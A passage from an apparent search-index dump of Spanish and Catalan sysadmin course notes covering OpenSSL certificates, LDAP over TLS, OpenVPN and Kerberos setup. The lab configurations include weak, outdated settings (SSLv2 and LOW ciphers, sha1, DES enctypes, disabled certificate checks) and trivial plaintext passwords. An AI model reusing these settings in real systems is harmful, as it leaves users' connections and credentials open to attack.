autosigned.server.key # verificar que el certificado y la llave privada se corresponden. \u279c openssl x509 -noout -modulus -in autosigned.server.crt | openssl md5 ( stdin )= 749c4e62abb2fcc4f16325f5ccbe5d24 \u279c openssl rsa -noout -modulus -in autosigned.server.key | openssl md5 ( stdin )= 749c4e62abb2fcc4f16325f5ccbe5d24","title":"Examinar contenido de certificados y llaves"},{"location":"seguridad/Certificados-Digitales/#no-se-que","text":"[ root@hp01 m11 ] # openssl s_client -connect 172.17.0.2:443 --- GET / HTTP/1.1 Host: www.m11.cat --- GET / HTTP/1.1 Host: www.admin.cat [ root@hp01 m11 ] # curl -v -ssl https://www.m11.cat [ root@https / ] # openssl s_client -connect pop.gmail.com:995 USER edtasixm14 +OK send PASS PASS xxxxx +OK Welcome. STAT +OK 8 87440 LIST +OK 8 messages ( 87440 bytes ) 1 6928 2 7758 3 4844 4 5364 5 5071 6 35142 7 12120 8 10213 . QUIT DONE # conectar con sclient a un virtual host openssl s_client -servername www.web1.org -connect 172 .17.0.2:443 openssl s_client -CAfile cacert.pem -servername www.web1.org -connect 172 .17.0.2:443 # verificar \u279c tls19:https openssl verify -CAfile cacert.pem servercert.web1.pem # descargar certificado remoto \u279c tls19:https openssl s_client -servername www.web1.org -connect 172 .17.0.2:443 < /dev/null 2 > /dev/null | openssl x509 -outform PEM > downloaded.cert.pem \u279c tls19:https openssl x509 -noout -text -in downloaded.cert.pem","title":"No se que"},{"location":"seguridad/Certificados-Digitales/#ldap-tls","text":"Ldap con conexiones seguras TLS/SSL y startTLS.","title":"Ldap tls"},{"location":"seguridad/Certificados-Digitales/#generar-certificados","text":"# genrar llaves privadas, del servidor. openssl genrsa -out cakey.pem 2048 openssl genrsa -out serverkey.pem 2048 # genrar certificado propio de la entidad CA por 365 dias openssl req -new -x509 -nodes -sha1 -days 365 -key cakey.pem -out cacrt.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :Varitat Absoluta Organizational Unit Name ( eg, section ) [] :Dep de certificats Common Name ( e.g. server FQDN or YOUR name ) [] :VeritatAbsoluta Email Address [] :admin@edt.org # generar una de certificado request para enviar a la entidad certificadora CA openssl req -new -key serverkey.pem -out servercsr.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :escola de mi casa Organizational Unit Name ( eg, section ) [] :dep informatica Common Name ( e.g. server FQDN or YOUR name ) [] :ldap.edt.org Email Address [] :admin@edt.org Please enter the following 'extra' attributes to be sent with your certificate request A challenge password [] :request password An optional company name [] :edt # Una entidad CA a de firmar el servercsr.pem y devolvernos un certificado.crt, como hago yo mismo de entidad cat ca.conf basicConstraints = critical,CA:FALSE extendedKeyUsage = serverAuth,emailProtection # Autoridad CA firmando el certificado openssl x509 -CA cacrt.pem -CAkey cakey.pem -req -in servercsr.pem -days 365 -sha1 -extfile ca.conf -CAcreateserial -out servercrt.pem Signature ok subject = C = ca, ST = Barcelona, L = Barcelona, O = escola de mi casa, OU = dep informatica, CN = ldap.edt.org, emailAddress = admin@edt.org Getting CA Private Key # archivos finales \u279c ll total 60K -rw-r--r-- 1 debian debian 83 abr 1 10 :14 ca.conf -rw-r--r-- 1 debian debian 1 ,5K abr 1 10 :23 cacrt.pem -rw-r--r-- 1 debian debian 41 abr 1 10 :35 cacrt.srl -rw------- 1 debian debian 1 ,7K abr 1 10 :14 cakey.pem -rw-r--r-- 1 debian debian 1 ,5K abr 1 10 :35 servercrt.pem -rw-r--r-- 1 debian debian 1 ,2K abr 1 10 :32 servercsr.pem -rw------- 1 debian debian 1 ,7K abr 1 10 :14 serverkey.pem","title":"Generar certificados"},{"location":"seguridad/Certificados-Digitales/#configuracion","text":"slapd.conf --- TLSCACertificateFile /etc/openldap/certs/cacrt.pem TLSCertificateFile /etc/openldap/certs/servercrt.pem TLSCertificateKeyFile /etc/openldap/certs/serverkey.pem TLSVerifyClient never TLSCipherSuite HIGH:MEDIUM:LOW:+SSLv2 --- ldap.conf --- TLS_CACERT /etc/openldap/certs/cacrt.pem SASL_NOCANON on URI ldap://ldap.edt.org BASE dc = edt,dc = org --- startup.sh --- /sbin/slapd -d0 -h \"ldap:/// ldaps:/// ldapi:///\" --- cliente ldap.conf TLS_CACERT /etc/ldap/cacrt.pem TLS_REQCERT allow URI ldap://ldap.edt.org BASE dc = edt,dc = org SASL_NOCANON on","title":"Configuraci\u00f3n"},{"location":"seguridad/Certificados-Digitales/#comprobaciones","text":"ldapsearch -x -LLL -ZZ dn ldapsearch -x -LLL -ZZ -h ldap.edt.org -b 'dc=edt,dc=org' dn ldapsearch -x -LLL -H ldaps://ldap.edt.org dn openssl s_client -connect ldap.edt.org:636","title":"Comprobaciones"},{"location":"seguridad/Certificados-Digitales/#docker","text":"\u279c docker run --rm --name ldap.edt.org -h ldap.edt.org -p 389 :389 -p 636 :636 -d jorgepastorr/ldapserver19:tls","title":"Docker"},{"location":"seguridad/Certificados-Digitales/#openvpn","text":"","title":"OpenVpn"},{"location":"seguridad/Certificados-Digitales/#generar-llaves-servidor","text":"Primero creamos nuestra CA \u279c openssl genrsa -des3 -out cakey.pem 2048 \u279c openssl req -new -x509 -nodes -sha1 -days 365 -key cakey.pem -out cacert.pem Enter pass phrase for cakey.pem: You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :Veritat absoluta Organizational Unit Name ( eg, section ) [] :Departament de certificats Common Name ( e.g. server FQDN or YOUR name ) [] :VeritatAbsoluta Email Address [] :admin@edt.org \u279c ll -rw-r--r-- 1 debian debian 1 ,5K mar 30 11 :24 cacert.pem -rw------- 1 debian debian 1 ,8K mar 30 11 :17 cakey.pem generar la llave del servidor y el request para enviar a la CA para que nos certifique. \u279c openssl dhparam -out dh2048.pem 2048 # llave del server \u279c openssl genrsa -out serverkey.pem 2048 Generating RSA private key, 2048 bit long modulus ( 2 primes ) .........................................+++++ ................................................................+++++ e is 65537 ( 0x010001 ) # request para la CA \u279c openssl req -new -key serverkey.pem -out serverreq.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :barcelona Locality Name ( eg, city ) [] :barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :server vvpn Organizational Unit Name ( eg, section ) [] :VpnServer Common Name ( e.g. server FQDN or YOUR name ) [] :VpnServer Email Address [] : Please enter the following 'extra' attributes to be sent with your certificate request A challenge password [] :request password An optional company name [] :edt Como no tenemos CA externa, simulamos una y nos auto certificamos. fichero de extensiones para servidor: ext.server.conf basicConstraints = CA:FALSE nsCertType = server nsComment = \"OpenSSL Generated Server Certificate\" subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always extendedKeyUsage = serverAuth keyUsage = digitalSignature, keyEncipherment Generar certificado ( esto lo deber\u00eda hacer una certificadora externa a nosotros ) \u279c openssl x509 -CAkey cakey.pem -CA cacert.pem -req -in serverreq.pem -days 365 -CAcreateserial -extfile ext.server.conf -out servercert.pem Signature ok subject = C = ca, ST = barcelona, L = barcelona, O = server vvpn, OU = VpnServer, CN = VpnServer Getting CA Private Key Archivos generados: \u279c tls19:vpn ll total 64K -rw-r--r-- 1 debian debian 1 ,4K abr 3 19 :29 cacert.pem -rw-r--r-- 1 debian debian 41 abr 3 19 :40 cacert.srl -rw------- 1 debian debian 1 ,7K abr 3 19 :27 cakey.pem -rw-r--r-- 1 debian debian 424 abr 4 11 :39 dh2048.pem -rw-r--r-- 1 debian debian 301 abr 3 19 :12 ext.server.conf -rw-r--r-- 1 debian debian 1 ,8K abr 3 19 :37 servercert.pem -rw------- 1 debian debian 1 ,7K abr 3 19 :30 serverkey.pem -rw-r--r-- 1 debian debian 1 ,1K abr 3 19 :32 serverreq.pem","title":"Generar llaves servidor"},{"location":"seguridad/Certificados-Digitales/#generar-llaves-cliente","text":"Lo recomendable es que cada cliente tenga una llave propia para conectar con el servidor, por lo tanto estos pasos se deben repetir por cada cliente que quiera conectar con el servidor. generar llave de cliente y request para certificar. \u279c openssl genrsa -out cliekey1.pem 2048 Generating RSA private key, 2048 bit long modulus ( 2 primes ) ........................................................................+++++ ....................................................+++++ e is 65537 ( 0x010001 ) # generar request ( quien soy ) \u279c openssl req -new -key cliekey1.pem -out cliereq1.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :barcelona Locality Name ( eg, city ) [] :barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :cliente 1 server vpn Organizational Unit Name ( eg, section ) [] :cliente1 Common Name ( e.g. server FQDN or YOUR name ) [] :cliente1 Email Address [] : Please enter the following 'extra' attributes to be sent with your certificate request A challenge password [] :request password An optional company name [] :edt Generar certificado desde una CA, una CA verifica que eres quien dices ser. fichero de extensiones para cliente basicConstraints = CA:FALSE subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always \u279c openssl x509 -CAkey cakey.pem -CA cacert.pem -req -in cliereq1.pem -days 365 -CAcreateserial -extfile ext.client.conf -out cliecert1.pem Signature ok subject = C = ca, ST = barcelona, L = barcelona, O = cliente 1 server vpn, OU = cliente1, CN = cliente1 Getting CA Private Key Archivos generados para cliente: \u279c ll -rw-r--r-- 1 debian debian 1 ,4K abr 3 19 :29 cacert.pem -rw-r--r-- 1 debian debian 1 ,6K abr 3 19 :40 cliecert1.pem -rw------- 1 debian debian 1 ,7K abr 3 19 :38 cliekey1.pem -rw-r--r-- 1 debian debian 3 ,6K abr 3 19 :15 client.conf -rw-r--r-- 1 debian debian 1 ,1K abr 3 19 :40 cliereq1.pem -rw-r--r-- 1 debian debian 113 abr 3 19 :13 ext.client.conf","title":"Generar llaves cliente"},{"location":"seguridad/Certificados-Digitales/#tunel-manual","text":"Una manera de verificar que los certificados funcionan correctamente es creando un t\u00fanel manualmente, si funcionan correctamente pasamos va configurar el servidor. pc02 \u279c sudo openvpn --remote pc03 --dev tun1 --ifconfig 10 .4.0.1 10 .4.0.2 --tls-server --dh dh2048.pem --ca cacert.pem --cert servercert.pem --key serverkey.pem --reneg-sec 60 [ jorge@pc03 certs ] $ sudo openvpn --remote pc02 --dev tun1 --ifconfig 10 .4.0.2 10 .4.0.1 --tls-client --ca cacert.pem --cert cliecert1.pem --key cliekey1.pem --reneg-sec 60","title":"T\u00fanel manual"},{"location":"seguridad/Certificados-Digitales/#configurar","text":"","title":"Configurar"},{"location":"seguridad/Certificados-Digitales/#servidor","text":"Primero de todo hacemos una copia del servicio y lo modificamos para tener una configuraci\u00f3n como se ve en el siguiente recuadro [ fedora@aws ~ ] $ sudo cp /lib/systemd/system/openvpn-server@.service /etc/systemd/system/. [ fedora@aws ~ ] $ cat /etc/systemd/system/openvpn-server \\@ .service [ Unit ] Description = OpenVPN service for %I hisx After = syslog.target network-online.target [ Service ] Type = forking PrivateTmp = true ExecStartPre = /usr/bin/echo serveri %i %I PIDFile = /var/run/openvpn-server/%i.pid ExecStart = /usr/sbin/openvpn --daemon --writepid /var/run/openvpn-server/%i.pid --cd /etc/openvpn/ --config %i.conf [ Install ] WantedBy = multi-user.target Cogemos el archivo de configuraci\u00f3n de muestra y lo modificamos de la siguiente manera. [ fedora@aws ~ ] $ cp /usr/share/doc/openvpn/sample/sample-config-files/server.conf . [ fedora@aws ~ ] $ sudo cp server.conf /etc/openvpn/confserver.conf [ fedora@aws ~ ] $ cat /etc/openvpn/confserver.conf port 1194 proto udp dev tun # interfaz de vpn # nuestras llaves para el server ca /etc/openvpn/keys/cacert.pem cert /etc/openvpn/keys/servercert.pem key /etc/openvpn/keys/serverkey.pem dh /etc/openvpn/keys/dh2048.pem server 10 .8.0.0 255 .255.255.0 # red del vpn ifconfig-pool-persist ipp.txt client-to-client # clientes se ven entre ellos ; duplicate-cn # no permitir diferentes conexxiones con la misma llave keepalive 10 120 cipher AES-256-CBC comp-lzo # compresion persist-key persist-tun # datos de logs status openvpn-status.log verb 3 explicit-exit-notify 1 Los archivos de configuraci\u00f3n quedan con la siguiente estructura. [ fedora@ip-172-31-92-8 ~ ] $ sudo tree /etc/openvpn/ /etc/openvpn/ \u251c\u2500\u2500 client \u251c\u2500\u2500 confserver.conf \u251c\u2500\u2500 ipp.txt \u251c\u2500\u2500 keys \u2502 \u251c\u2500\u2500 cacert.pem \u2502 \u251c\u2500\u2500 dh2048.pem \u2502 \u251c\u2500\u2500 servercert.pem \u2502 \u2514\u2500\u2500 serverkey.pem \u251c\u2500\u2500 openvpn-status.log \u2514\u2500\u2500 server Poner en marcha el servidor. Al poner en marcha el servidor Hay que tener en cuenta que hemos modificado un dominio manualmente, por eso se han de recargar. Otra cosa a tener en cuenta es que en el start, hay que indicar el nombre del archivo de configuraci\u00f3n openvpn-server@confserver # recargar los dominios [ fedora@aws ~ ] $ sudo systemctl daemon-reload # encender el servidor [ fedora@aws ~ ] $ sudo systemctl start openvpn-server@confserver.service # comprovar interfaz creada [ fedora@aws ] $ ip a s tun0 8 : tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100 link/none inet 10 .8.0.1 peer 10 .8.0.2/32 scope global tun0 valid_lft forever preferred_lft forever inet6 fe80::b502:a827:5610:7c23/64 scope link stable-privacy valid_lft forever preferred_lft forever","title":"Servidor"},{"location":"seguridad/Certificados-Digitales/#cliente","text":"En la configuraci\u00f3n del cliente es mas simple, ya que solo se a de modificar el archivo de configuraci\u00f3n, agregar las llaves del cliente en su sitio y arrancar el servicio. Todos estos pasos se han de hacer por cada cliente con sus claves propias. Archivo de configuraci\u00f3n: [ jorge@pc03 ] $ sudo cat client/confclient.conf client dev tun proto udp remote aws 1194 # ip/host port del servidor remoto resolv-retry infinite nobind persist-key persist-tun # certificados ca /etc/openvpn/keys/cacert.pem cert /etc/openvpn/keys/cliecert1.pem key /etc/openvpn/keys/cliekey1.pem remote-cert-tls server cipher AES-256-CBC comp-lzo verb 3 Se colocan las llaves en su sitio indicado [ jorge@pc03 openvpn ] $ sudo tree . \u251c\u2500\u2500 client \u2502 \u2514\u2500\u2500 confclient.conf \u251c\u2500\u2500 keys \u2502 \u251c\u2500\u2500 cacert.pem \u2502 \u251c\u2500\u2500 cliecert1.pem \u2502 \u2514\u2500\u2500 cliekey1.pem \u2514\u2500\u2500 server Como no tengo resoluci\u00f3n dns indico la resoluci\u00f3n en el /etc/hosts [ jorge@pc03 ] $ cat /etc/hosts 127 .0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 3 .86.219.56 aws Arrancar y comprobar. # arrancar servicio, con el nombre del archivo de configuraci\u00f3n [ jorge@pc03 ] $ sudo systemctl start openvpn-client@confclient # verificar que se a creado la interfaz [ jorge@pc03 ] $ ip a s tun0 9 : tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100 link/none inet 10 .8.0.6 peer 10 .8.0.5/32 scope global tun0 valid_lft forever preferred_lft forever inet6 fe80::7b5f:a77b:2a32:be1e/64 scope link stable-privacy valid_lft forever preferred_lft forever # comprovar que llego al otro extremo [ jorge@pc03 ] $ curl 10 .8.0.1:13 04 APR 2020 11 :26:59 UTC","title":"Cliente"},{"location":"seguridad/Certificados-Digitales/#extensiones","text":"","title":"Extensiones"},{"location":"seguridad/Certificados-Digitales/#fichero-especifico-de-extension","text":"Generar un certificado de servidor ldap que correr\u00e1 en un container llamado ldap.edt.org pero que tambi\u00e9n acepte conexiones realizadas en nip 172.17.0.2, 127.0.0.1, ldaps://mysecureldapserver.org . Creo un fichero de extensiones y defino el subjectAltName para cada uno de los nombres alternativos. ext.alterare.conf basicConstraints = CA:FALSE extendedKeyUsage = serverAuth subjectAltName = IP:172.17.0.2,IP:127.0.0.1,email:copy,URI:ldaps://mysecureldapserver.org \u279c ldap openssl x509 -CAkey cakey.pem -CA cacrt.pem -req -in serverreq.pem -days 365 -CAcreateserial -extfile ext.alterate.conf -out servercert.alternate.pem Signature ok subject = C = ca, ST = barcelona, L = barcelona, O = edt, OU = EDT, CN = ldap.edt.org Getting CA Private Key \u279c ldap openssl x509 -noout -text -in servercert.alternate.pem Certificate: Data: Version: 3 ( 0x2 ) Serial Number: 7a:e9:d4:14:65:f2:8e:66:aa:9c:0f:88:33:24:8c:cb:21:02:05:dc Signature Algorithm: sha256WithRSAEncryption Issuer: C = ca, ST = Barcelona, L = Barcelona, O = Veritat absoluta, OU = departament certificats, CN = VeritatAbsoluta Validity Not Before: Apr 6 08 :54:33 2020 GMT Not After : Apr 6 08 :54:33 2021 GMT Subject: C = ca, ST = barcelona, L = barcelona, O = edt, OU = EDT, CN = ldap.edt.org Subject Public Key Info: ... X509v3 extensions: X509v3 Basic Constraints: CA:FALSE X509v3 Extended Key Usage: TLS Web Server Authentication X509v3 Subject Alternative Name: IP Address:172.17.0.2, IP Address:127.0.0.1, URI:ldaps://mysecureldapserver.org","title":"fichero especifico de extensi\u00f3n"},{"location":"seguridad/Certificados-Digitales/#fichero-global","text":"fedora: /etc/pki/tls/openssl.cnf , debian: /etc/ssl/openssl.cnf openssl.cnf ... [ my_client ] basicConstraints = CA:FALSE subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always [ my_server ] basicConstraints = CA:FALSE nsCertType = server nsComment = \"OpenSSL Generated Server Certificate\" subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always extendedKeyUsage = serverAuth keyUsage = digitalSignature, keyEncipherment ... Certificar usando la extensi\u00f3n del fichero global # Ca utilizando extension de archivo de configuraci\u00f3n \u279c ldap openssl x509 -CAkey cakey.pem -CA cacrt.pem -req -in serverreq.pem -days 365 -CAcreateserial -extfile /etc/ssl/openssl.cnf -extensions my_client -out servercert.alternate.pem # certificado autofirmado \u279c ldap openssl req -new -x509 -key cakey.pem -config openssl.cnf -extensions usr_cert -out cert1.pem","title":"fichero global"},{"location":"seguridad/Kerberos/","text":"Kerberos Es un protocolo de autenticaci\u00f3n de redes de ordenador creado por el MIT que permite a dos ordenadores en una red insegura demostrar su identidad mutuamente de manera segura. : tanto cliente como servidor verifican la identidad uno del otro. Los mensajes de autenticaci\u00f3n est\u00e1n protegidos para evitar eavesdropping y ataques de Replay . Kerberos se basa en criptograf\u00eda de clave sim\u00e9trica y requiere un tercero de confianza . El usuario se conecta con un servidor de kerberos y obtiene un tiquet, este tiquet es la prueba de quien eres. En los servidores kerberizados (que entienden kerberos), los usuarios presentas su tiquet, y el servidor kerberizado se comunica con el server kerberos para verificar quien es y autenticar. Ejemplo de tiquet: [ isx47787241@i09 curs ] $ klist Ticket cache: FILE:/tmp/krb5cc_101709_6EW9wO Default principal: isx47787241@INFORMATICA.ESCOLADELTREBALL.ORG Valid starting Expires Service principal 18 /02/20 08 :46:52 19 /02/20 08 :46:52 krbtgt/INFORMATICA.ESCOLADELTREBALL.ORG@INFORMATICA.ESCOLADELTREBALL.ORG 18 /02/20 08 :46:56 19 /02/20 08 :46:52 nfs/madiba.informatica.escoladeltreball.org@INFORMATICA.ESCOLADELTREBALL.ORG Auth autentication ( quien soy ) AP autentication provider: son los m\u00e9todos de autenticaci\u00f3n, es decir, verificar quien eres. Esto lo proporciona : kerberos, ldap, /etc/passwd Autz authorization ( que tengo derecho a hacer) IP information provider: Una vez sabido quien eres, que puedes hacer, se dicta a trabes de uid, gid, ... Se proporciona a trabes de: ldap, /etc/passwd Autenticaction Provider AP Kerberos propoerciona el servei de prove\u00efdor d'autenticaci\u00f3. No emmagatzema informaci\u00f3 dels comptes d'usuari com el uid, git, shell, etc. Simplement emmagatzema i gestiona els passwords dels usuaris, en entrades anomenades principals en la seva base de dades. Coneixem els seg\u00fcents AP: /etc/passwd que cont\u00e9 els password (AP) i tamb\u00e9 la informaci\u00f3 dels comptes d'usuari (IP). ldap el servei de directori ldap cont\u00e9 informaci\u00f3 dels comptes d'usuari (IP) i tamb\u00e9 els seus passwords (AP). kerberos que \u00fanicament actua de AP i no de IP. Information Provider IP Els serveis que emmagatzemen la informaci\u00f3 dels comptes d'usuari s'anomenen Information providers. Aquests serveis proporcionen el uid, gid, shell, gecos, etc. Els cl\u00e0ssics s\u00f3n /etc/passwd i ldap. Kerberos utiliza tres servicios: 88 /tcp open kerberos-sec 464 /tcp open kpasswd5 749 /tcp open kerberos-adm kadmind : demonio del servicio de administraci\u00f3n kerberos krb5kdc : demonio de kerberos encargado de distribuir tiquets. Instalaci\u00f3n del server instalar paquetes dnf -y install krb5-server krb5-workstation # tree /var/kerberos/ /var/kerberos/ \u251c\u2500\u2500 krb5 \u2502 \u2514\u2500\u2500 user \u2514\u2500\u2500 krb5kdc \u251c\u2500\u2500 kadm5.acl \u2514\u2500\u2500 kdc.conf configurar Modificar el fichero de configuraci\u00f3n principal /etc/krb5.conf a\u00f1adir nuestro dominio ( realm ) y especificar el servidor includedir /etc/krb5.conf.d/ [ logging ] default = FILE:/var/log/krb5libs.log kdc = FILE:/var/log/krb5kdc.log admin_server = FILE:/var/log/kadmind.log [ libdefaults ] dns_lookup_realm = false ticket_lifetime = 24h renew_lifetime = 7d forwardable = true rdns = false default_realm = EDT.ORG # default_ccache_name = KEYRING:persistent:%{uid} [ realms ] EDT.ORG = { # servidor kerberos kdc = kserver.edt.org admin_server = kserver.edt.org } [ domain_realm ] .edt.org = EDT.ORG edt.org = EDT.ORG Poner el REALM en el archivo /var/kerberos/krb5kdc/kdc.conf [ kdcdefaults ] kdc_ports = 88 kdc_tcp_ports = 88 [ realms ] EDT.ORG = { #master_key_type = aes256-cts acl_file = /var/kerberos/krb5kdc/kadm5.acl dict_file = /usr/share/dict/words admin_keytab = /var/kerberos/krb5kdc/kadm5.keytab supported_enctypes = aes256-cts:normal aes128-cts:normal des3-hmac-sha1:normal arcfour-hmac:normal camellia256-cts:normal camellia128-cts:normal des-hmac-sha1:normal des-cbc-md5:normal des-cbc-crc:normal } Crear base de datos Crear la base de datos que almacena claves principales ( usuarios y maquinas ) kdb5_util create -s -P masterkey # verificar que se a creado tree /var/kerberos/ /var/kerberos/ \u251c\u2500\u2500 krb5 \u2502 \u2514\u2500\u2500 user \u2514\u2500\u2500 krb5kdc \u251c\u2500\u2500 kadm5.acl \u251c\u2500\u2500 kdc.conf \u251c\u2500\u2500 principal \u251c\u2500\u2500 principal.kadm5 \u251c\u2500\u2500 principal.kadm5.lock \u2514\u2500\u2500 principal.ok definir acl's Definir las acl de los usuarios principales en /var/kerberos/krb5kdc/kadm5.acl */admin@EDT.ORG * superuser@EDT.ORG * pau/admin@EDT.ORG * marta@EDT.ORG * a\u00f1adir usuarios crear usuarios principales kadmin.local -q \"addprinc -pw superuser superuser\" kadmin.local -q \"addprinc -pw admin admin\" kadmin.local -q \"addprinc -pw kpere pere\" kadmin.local -q \"addprinc -pw kmarta marta\" kadmin.local -q \"addprinc -pw kjordi jordi\" kadmin.local -q \"addprinc -pw kpau pau\" kadmin.local -q \"addprinc -pw kpau pau/admin\" [ root@kserver / ] # kadmin.local -q \"list_principals\" Authenticating as principal root/admin@EDT.ORG with password. K/M@EDT.ORG admin@EDT.ORG jordi@EDT.ORG kadmin/admin@EDT.ORG kadmin/changepw@EDT.ORG kadmin/kserver@EDT.ORG kiprop/kserver@EDT.ORG krbtgt/EDT.ORG@EDT.ORG marta@EDT.ORG pau/admin@EDT.ORG pau@EDT.ORG pere@EDT.ORG superuser@EDT.ORG Arrancar servicio systemctl start bkrb5kdc.service systemctl start kadmin.service /usr/sbin/krb5kdc /usr/sbin/kadmind -nofork Instalaci\u00f3n cliente [ root@kclient / ] # dnf install -y krb5-workstation Configuraci\u00f3n [ root@khost / ] # vi /etc/krb5.conf includedir /etc/krb5.conf.d/ [ logging ] default = FILE:/var/log/krb5libs.log kdc = FILE:/var/log/krb5kdc.log admin_server = FILE:/var/log/kadmind.log [ libdefaults ] dns_lookup_realm = false ticket_lifetime = 24h renew_lifetime = 7d forwardable = true rdns = false default_realm = EDT.ORG # default_ccache_name = KEYRING:persistent:%{uid} [ realms ] EDT.ORG = { # servidor kerberos kdc = kserver.edt.org admin_server = kserver.edt.org } [ domain_realm ] .edt.org = EDT.ORG edt.org = EDT.ORG Comprobar [ root@khost / ] # kinit marta Password for marta@EDT.ORG: [ root@khost / ] # klist Ticket cache: FILE:/tmp/krb5cc_0 Default principal: marta@EDT.ORG Valid starting Expires Service principal 02 /18/20 18 :52:27 02 /19/20 18 :52:27 krbtgt/EDT.ORG@EDT.ORG Gesti\u00f3n de acl Definir las acl de los usuarios principales en /var/kerberos/krb5kdc/kadm5.acl El orden de las entradas es significativo. La primera entrada coincidente especifica el principal en el que se aplica el acceso de control, ya sea solo en el principal o en el principal cuando opera en un principal objetivo. Las l\u00edneas que contienen entradas de ACL deben tener el siguiente formato: principal operation-mask [ operation-target ] Operation mask : Permisos sobre que se podr\u00e1 hacer, si la opci\u00f3n est\u00e1 en may\u00fascula se denegar\u00e1 la acci\u00f3n, en min\u00fascula se aprueba, es decir a permite crear principales, A deniega crear principales. Con la excepci\u00f3n de x que no tiene versi\u00f3n may\u00fascula. a permite crear principals y politicas c permite cambio de contrase\u00f1as a principals d permite eliminar principals y politicas i permite consultas sobre principals y politicas l permite listar principals y politicas m permite modificar principals y politicas p permite la propagaci\u00f3n de la base de datos principal (utilizada en la propagaci\u00f3n de base de datos incremental) s permite la configuraci\u00f3n expl\u00edcita de la clave para un principal x Corto para admcil. Todos los privilegios * Igual que x. Operation target : opcional, objeto sobre el cual podr\u00e1 aplicar los permisos indicados, si no se indica ninguno es a todos. Ejemplos: # el usuario kser01/admin tiene permido de: add,delete, modifi. sobre todos los usuarios kuser01/admin@realm adm # el usuario kuser01 tiene permisos sobre todos los usuarios del grupo instance de: cambiar contrase\u00f1a, modificar y ver datos de usuario kuser01@EDT.ORG cim */instance@EDT.ORG # si hay un mach solo se aplica la primea regla, kuser01 solo puede cambiar contrase\u00f1as kuser01@EDT.ORG c kuser01@EDT.ORG * # kuser01 puede camiar contrase\u00f1a solo a kuser05 kuser01@EDT.ORG c kuser05@EDT.ORG # todos los usuarios pueden cambiarse la contrase\u00f1a a si mismos, no a los demas. *@EDT.ORG c self@EDT.ORG # \u00bf? sms@ATHENA.MIT.EDU x * -maxlife 9h -postdateable # kuser01 puede a\u00f1adir usuarios pero no borrarlos kuser01@EDT.ORG aD # todos los usuarios pueden cambiarse la contrase\u00f1a y kuser01 ademas puede listar y ver usuarios. *@EDT.ORG c self@EDT.ORG kuser01@EDT.ORG li Gesti\u00f3n del servidor Para gestionar el servidor kerberos se tiene las siguientes herramientas. kadmin.local utilidad de administraci\u00f3n de la base de datos de principals, esta utilidad accede a bajo nivel modifica los ficheros directamente. solo se puede utilizar directamente desde el servidor y con privilegios de root. kadmin utilidad de administraci\u00f3n que conecta con el servidor por red usando el protocolo kerberos. Se puede utilizar desde cualquier cliente o servidor y establece una conexi\u00f3n de red segura. Los permisos de ACL's establecidos determina los privilegios de cada usuario. Desde host: kinit kuser06 # pedir tiquet klist # listar tiquet kpasswd # cambiar password Password for kuser06@EDT.ORG: Enter new password: Enter it again: Password changed. kdestroy # eliminar tiquet Desde server: # a\u00f1adir principal kadmin.local -q \"addprinc superuser\" kadmin.local -q \"addprinc -pw contrasena kuser03\" kadmin: addprinc pau # listar principals kadmin.local -q \"listprincs\" kadmin: listprincs # ver principal kadmin: getprinc kuser06 kadmin.local -q \"getprinc kuser06\" # cabiar contrase\u00f1a kadmin.local -q \"change_password kuser02\" kadmin.local -q \"cpw kuser02\" # eliminar principal kadmin.local -q \"delprinc kuser02\" # modificar principal kadmin: modprinc -expire \"12/31 7pm\" kuser01 https://docs.oracle.com/cd/E19683-01/816-0211/6m6nc66tj/index.html addprinc -randkey host/sshd.edt.org ktadd -k /etc/krb5.keytab host/sshd.edt.org docker exec kserver.edt.org kadmin -p marta -w kmarta -q listprincs docker system prune","title":"Kerberos"},{"location":"seguridad/Kerberos/#kerberos","text":"Es un protocolo de autenticaci\u00f3n de redes de ordenador creado por el MIT que permite a dos ordenadores en una red insegura demostrar su identidad mutuamente de manera segura. : tanto cliente como servidor verifican la identidad uno del otro. Los mensajes de autenticaci\u00f3n est\u00e1n protegidos para evitar eavesdropping y ataques de Replay . Kerberos se basa en criptograf\u00eda de clave sim\u00e9trica y requiere un tercero de confianza . El usuario se conecta con un servidor de kerberos y obtiene un tiquet, este tiquet es la prueba de quien eres. En los servidores 